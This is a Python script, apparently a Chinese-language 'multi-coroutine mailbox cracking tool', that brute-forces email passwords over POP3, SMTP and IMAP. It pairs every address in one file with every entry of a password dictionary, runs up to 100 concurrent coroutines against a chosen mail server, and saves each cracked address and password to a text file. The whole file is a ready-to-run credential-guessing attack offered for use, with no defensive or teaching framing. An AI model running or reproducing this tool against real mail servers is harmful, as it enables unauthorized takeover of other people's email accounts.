import gevent
from gevent import monkey
monkey.patch_all()
import argparse
from rich.console import Console
import poplib
import smtplib
import imaplib
import queue

logo = r"""
                        一款多协程邮箱爆破工具

   _____         .__.__    _________                       __    
  /     \ _____  |__|  |   \_   ___ \____________    ____ |  | __
 /  \ /  \\__  \ |  |  |   /    \  \/\_  __ \__  \ _/ ___\|  |/ /
/    Y    \/ __ \|  |  |__ \     \____|  | \// __ \\  \___|    < 
\____|__  (____  /__|____/  \______  /|__|  (____  /\___  >__|_ \
        \/     \/                  \/            \/     \/     \/

                                                     by:HumorKing                               
    """

console = Console()

mail_que = queue.Queue()

class Crack():
    def __init__(self, domain):
        self.success_list=[]
        self.domain = domain
        self.file=open(f'{domain}.txt','a',encoding='utf-8')

    def pop_crack(self, ssl=False):
        while True:
          if mail_que.qsize() == 0:
              break
          data=mail_que.get()
          mail=data[0]
          passwd=data[1]
          
          if mail in self.success_list:
              break
          if ssl:
              pop3_server = poplib.POP3_SSL(self.domain)
          else:
              pop3_server = poplib.POP3(self.domain)
          console.print(f'cracking {mail}!',style='bold red')
          pop3_server.user(mail)
          try:
              auth = pop3_server.pass_(passwd).decode()
              self.success_list.append(mail)
              console.print(f"crack success!\t{mail}:{passwd}",style='green')
              self.file.write(f"{mail}:{passwd}\n")
              pop3_server.close()
          except:
              pass

    def smtp_crack(self, ssl=False):
        while True:
          if mail_que.qsize() == 0:
              break
          data=mail_que.get()
          mail=data[0]
          passwd=data[1]
          if mail in self.success_list:
              break
          if ssl:
              smtp_server = smtplib.SMTP_SSL(self.domain)
          else:
              smtp_server = smtplib.SMTP(self.domain)
          console.print(f'cracking {mail}!',style='bold red')
          try:
              auth=smtp_server.login(mail,passwd)
              self.success_list.append(mail)
              console.print(f"crack success!\t{mail}:{passwd}",style='green')
              self.file.write(f"{mail}:{passwd}\n")
              smtp_server.close()
          except:
              pass
    def imap_crack(self, ssl=False):
        while True:
          if mail_que.qsize() == 0:
              break
          data=mail_que.get()
          mail=data[0]
          passwd=data[1]
          if mail in self.success_list:
              break
          if ssl:
              imap_server=imaplib.IMAP4_SSL(self.domain)
          else:
              imap_server=imaplib.IMAP4(self.domain)
          console.print(f'cracking {mail}!',style='bold red')
          try:
              auth=imap_server.login(mail,passwd)
              self.success_list.append(mail)
              console.print(f"crack success!\n{mail}:{passwd}",style='green')
              self.file.write(f"{mail}:{passwd}\n")
              imap_server.close()
          except:
              pass
          print(1)
        
    def run(self,mail,passwd,model,ssl,t_num):
        console.print("正在载入数据中.........",style='bold red')
        with open(mail,'r',encoding='utf-8') as Mail:
            with open(passwd,'r',encoding='utf-8') as Pass:
                mail_list=Mail.readlines()
                passwd_list=Pass.readlines()
                for mail in mail_list:
                    for passwd in passwd_list:
                        mail=mail.strip()
                        passwd=passwd.strip()
                        data=(mail,passwd)
                        mail_que.put(data)
            console.print("开启协程进行爆破！",style='bold red')
            # 开启多协程
            cos = []
            if model == 'pop':
                for i in range(t_num):
                  c=gevent.spawn(self.pop_crack,ssl)
                  cos.append(c)
            elif model == 'imap':
                for i in range(t_num):
                  c=gevent.spawn(self.imap_crack,ssl)
                  cos.append(c)
            elif model == 'smtp':
                for i in range(t_num):
                  c=gevent.spawn(self.smtp_crack,ssl)
                  cos.append(c)
            gevent.joinall(cos)

console.print(logo,style='green')
parser = argparse.ArgumentParser(description='多协议邮箱爆破(POP、SMTP、IMAP)')
parser.add_argument('--domain', '-d', help='邮箱服务器地址',required=True)
parser.add_argument('--mail', '-m', help='邮箱地址文件',required=True)
parser.add_argument('--password', '-p', help='密码字典',required=True)
parser.add_argument('--model', '-a', help='协议[pop,imap,smtp] 默认imap',default='imap')
parser.add_argument('--ssl','-f',help='使用SSL(默认False)',default=False)
parser.add_argument('--thread','-t',help='协程数(默认100)',default=100)
args = parser.parse_args()

mail_crack=Crack(args.domain)
mail_crack.run(args.mail,args.password,args.model,args.ssl,int(args.thread))